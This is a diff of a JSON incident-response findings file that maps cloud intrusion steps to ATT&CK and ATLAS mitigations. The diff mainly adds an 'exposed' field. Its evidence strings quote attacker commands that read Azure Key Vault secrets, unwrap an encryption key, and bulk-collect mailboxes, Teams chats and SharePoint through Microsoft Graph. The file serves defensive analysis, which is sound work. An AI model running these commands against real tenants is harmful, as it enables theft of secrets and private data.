+    "evidence": "KeyVaultSecretRead: az keyvault secret list --vault-name \"$v\" -o tsv >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:4)\nKeyVaultSecretRead: curl -s -H \"Authorization: Bearer $KV\" \"https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4\" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)\nKeyVaultSecretRead: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)\nKeyVaultKeyUnwrap: curl -s -X POST -H \"Authorization: Bearer $KV\" -d @wrapped.json \"https://corpvault.vault.azure.net/keys/kek/0a1b2c3d/unwrapkey?api-version=7.4\" (20261015_093000_step05_vault.sh:8)",
+    "exposed": null
   },
   {
     "item": "Scope the data taken",
@@ -873,19 +789,21 @@
     "attack": null,
     "atlas": null,
     "targets": "resource /sites; resource /sites/root/drives",
-    "evidence": "MailboxAccess: mail = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/messages?$top=500\", headers=headers) (20261015_092000_step04_collect.py:8)\nTeamsMessageAccess: chat = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/mailFolders/TeamsMessagesData/messages\", headers=headers) (20261015_092000_step04_collect.py:9)\nSharePointEnumeration: sites = requests.get(\"https://graph.microsoft.com/v1.0/sites?search=*\", headers=headers) (20261015_092000_step04_collect.py:10)\nSharePointEnumeration: drive = requests.get(\"https://graph.microsoft.com/v1.0/sites/root/drives\", headers=headers) (20261015_092000_step04_collect.py:11)"
+    "evidence": "MailboxAccess: mail = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/messages?$top=500\", headers=headers) (20261015_092000_step04_collect.py:8)\nTeamsMessageAccess: chat = requests.get(\"https://graph.microsoft.com/v1.0/users/\" + user + \"/mailFolders/TeamsMessagesData/messages\", headers=headers) (20261015_092000_step04_collect.py:9)\nSharePointEnumeration: sites = requests.get(\"https://graph.microsoft.com/v1.0/sites?search=*\", headers=headers) (20261015_092000_step04_collect.py:10)\nSharePointEnumeration: drive = requests.get(\"https://graph.microsoft.com/v1.0/sites/root/drives\", headers=headers) (20261015_092000_step04_collect.py:11)",
+    "exposed": null
   },
   {
     "item": "Follow what was enumerated",
     "section": "remediation",
     "value": "low",
     "detail": "Use what was listed to predict targets: check those identities, vaults and hosts for later activity.",
-    "basis": "GraphDirectoryEnumeration, AzureResourceEnumeration, KeyVaultKeyEnumeration, Discovery tools, exposed username, exposed email, exposed resource, exposed ip",
+    "basis": "GraphDirectoryEnumeration, AzureResourceEnumeration, KeyVaultKeyEnumeration, Discovery tools, exposed email, exposed resource, exposed ip",
     "files": "20261015_090000_step01_token.sh, 20261015_090500_step02_recon.ps1, 20261015_092000_step04_collect.py, 20261015_093000_step05_vault.sh, agent_20261015_093500.jsonl, collect_20261015_092040.txt, directory_20261015_090530.txt",
     "attack": null,
     "atlas": null,
-    "targets": "resource /users; resource /servicePrincipals; resource /directoryRoles; command Get-MgApplication; command az keyvault list; vault $v; vault finvault; username alice@corp.example; username bob@corp.example; email alice@corp.example; email bob@corp.example; resource corp.sharepoint.com; ip 144.172.64.60",
-    "evidence": "GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/users?`$top=999\" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)\nGraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999\" (20261015_090500_step02_recon.ps1:3)\nGraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles\" (20261015_090500_step02_recon.ps1:4)\nGraphDirectoryEnumeration: Get-MgApplication -All (20261015_090500_step02_recon.ps1:5)\nAzureResourceEnumeration: az keyvault list --query \"[].name\" -o tsv > vaults_20261015_093010.txt (20261015_093000_step05_vault.sh:2)\nKeyVaultKeyEnumeration: az keyvault key list --vault-name \"$v\" -o tsv (20261015_093000_step05_vault.sh:5)\nKeyVaultKeyEnumeration: GET https://finvault.vault.azure.net/keys?api-version=7.4 (agent_20261015_093500.jsonl)\naz: az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)\naz: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)"
+    "targets": "resource /users; resource /servicePrincipals; resource /directoryRoles; command Get-MgApplication; command az keyvault list; vault $v; vault finvault",
+    "evidence": "GraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/users?`$top=999\" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)\nGraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/servicePrincipals?`$top=999\" (20261015_090500_step02_recon.ps1:3)\nGraphDirectoryEnumeration: Invoke-RestMethod -Headers $h -Uri \"https://graph.microsoft.com/v1.0/directoryRoles\" (20261015_090500_step02_recon.ps1:4)\nGraphDirectoryEnumeration: Get-MgApplication -All (20261015_090500_step02_recon.ps1:5)\nAzureResourceEnumeration: az keyvault list --query \"[].name\" -o tsv > vaults_20261015_093010.txt (20261015_093000_step05_vault.sh:2)\nKeyVaultKeyEnumeration: az keyvault key list --vault-name \"$v\" -o tsv (20261015_093000_step05_vault.sh:5)\nKeyVaultKeyEnumeration: GET https://finvault.vault.azure.net/keys?api-version=7.4 (agent_20261015_093500.jsonl)\naz: az login --service-principal -u \"$APP\" -p \"$SECRET\" --tenant \"$TENANT\" (20261015_090000_step01_token.sh:8)\naz: az keyvault secret show --vault-name finvault --name api-key (agent_20261015_093500.jsonl)",
+    "exposed": "email: alice@corp.example\nemail: bob@corp.example"
   },
   {
     "item": "M1015 Active Directory Configuration",
@@ -897,7 +815,8 @@
     "attack": "T1078.004",
     "atlas": null,
     "targets": "TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1017 User Training",
@@ -909,7 +828,8 @@
     "attack": "T1078.004, T1213.002, T1213.005",
     "atlas": null,
     "targets": "TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP); SharePointEnumeration: resource /sites, resource /sites/root/drives",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1018 User Account Management",
@@ -921,7 +841,8 @@
     "attack": "T1078.004, T1087.004, T1098.001, T1098.003, T1213.002, T1580",
     "atlas": null,
     "targets": "TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP); GraphDirectoryEnumeration: resource /users, resource /servicePrincipals, resource /directoryRoles, command Get-MgApplication; AppCredentialAddition: application 66666666-7777-4888-9999-000000000000; GlobalAdministratorAssignment: role roleTemplateId=62e90394-69f5-4237-9190-012177145e10; AppRoleAssignment: principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp), principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d; SharePointEnumeration: resource /sites, resource /sites/root/drives; KeyVaultKeyEnumeration: vault $v, vault finvault; AzureResourceEnumeration: command az keyvault list",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1026 Privileged Account Management",
@@ -933,7 +854,8 @@
     "attack": "T1078.004, T1098.001, T1098.003, T1555.006",
     "atlas": null,
     "targets": "TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP); AppCredentialAddition: application 66666666-7777-4888-9999-000000000000; GlobalAdministratorAssignment: role roleTemplateId=62e90394-69f5-4237-9190-012177145e10; AppRoleAssignment: principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp), principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d; KeyVaultSecretRead: vault $v, vault corpvault, secret db-password, vault finvault, secret api-key; KeyVaultKeyUnwrap: vault corpvault, key kek",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1027 Password Policies",
@@ -945,7 +867,8 @@
     "attack": "T1078.004",
     "atlas": null,
     "targets": "TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1030 Network Segmentation",
@@ -957,7 +880,8 @@
     "attack": "T1098.001",
     "atlas": null,
     "targets": "AppCredentialAddition: application 66666666-7777-4888-9999-000000000000",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1032 Multi-factor Authentication",
@@ -969,7 +893,8 @@
     "attack": "T1078.004, T1098.001, T1098.003, T1114.002",
     "atlas": null,
     "targets": "TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP); AppCredentialAddition: application 66666666-7777-4888-9999-000000000000; GlobalAdministratorAssignment: role roleTemplateId=62e90394-69f5-4237-9190-012177145e10; AppRoleAssignment: principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d ($sp), principal 9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1036 Account Use Policies",
@@ -981,7 +906,8 @@
     "attack": "T1078.004",
     "atlas": null,
     "targets": "TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1042 Disable or Remove Feature or Program",
@@ -993,7 +919,8 @@
     "attack": "T1098.001",
     "atlas": null,
     "targets": "AppCredentialAddition: application 66666666-7777-4888-9999-000000000000",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1041 Encrypt Sensitive Information",
@@ -1005,7 +932,8 @@
     "attack": "T1114.002",
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1047 Audit",
@@ -1017,7 +945,8 @@
     "attack": "T1087.004, T1213.002, T1213.005",
     "atlas": null,
     "targets": "GraphDirectoryEnumeration: resource /users, resource /servicePrincipals, resource /directoryRoles, command Get-MgApplication; SharePointEnumeration: resource /sites, resource /sites/root/drives",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "M1060 Out-of-Band Communications Channel",
@@ -1029,7 +958,8 @@
     "attack": "T1114.002, T1213.005",
     "atlas": null,
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0005 Control Access to AI Models and Data at Rest",
@@ -1041,7 +971,8 @@
     "attack": null,
     "atlas": "AML.T0012, AML.T0126",
     "targets": "TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP); SharePointEnumeration: resource /sites, resource /sites/root/drives",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0019 Control Access to AI Models and Data in Production",
@@ -1053,7 +984,8 @@
     "attack": null,
     "atlas": "AML.T0012",
     "targets": "TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0043 AI Agent External Resource Lifecycle Management",
@@ -1065,7 +997,8 @@
     "attack": null,
     "atlas": "AML.T0012",
     "targets": "TokenRequest: tenant 11111111-2222-4333-8444-555555555555 ($TENANT), client 66666666-7777-4888-9999-000000000000 ($APP)",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0039 AI Honeypots",
@@ -1077,7 +1010,8 @@
     "attack": null,
     "atlas": "AML.T0126",
     "targets": "SharePointEnumeration: resource /sites, resource /sites/root/drives",
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0020 Generative AI Guardrails",
@@ -1089,7 +1023,8 @@
     "attack": null,
     "atlas": "AML.T0102",
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   },
   {
     "item": "AML.M0022 Generative AI Model Alignment",
@@ -1101,6 +1036,7 @@
     "attack": null,
     "atlas": "AML.T0102",
     "targets": null,
-    "evidence": null
+    "evidence": null,
+    "exposed": null
   }
 ]
